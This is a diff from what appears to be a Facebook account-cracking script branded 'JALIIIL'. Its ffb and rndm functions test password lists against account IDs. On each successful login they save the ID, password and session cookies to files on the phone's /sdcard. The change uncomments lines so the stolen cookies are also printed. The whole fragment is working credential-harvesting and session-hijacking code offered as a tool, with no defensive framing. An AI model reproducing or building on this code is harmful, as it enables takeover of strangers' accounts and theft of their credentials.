@@ -615,7 +615,7 @@ def ffb(ids,names,passlist):
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/JALIIIL-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
@@ -887,7 +887,7 @@ def rndm(ids,passlist):
                                         
                                         print('\r\r\033[1;32m [JALIIIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/JALIIIL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/JALIIIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
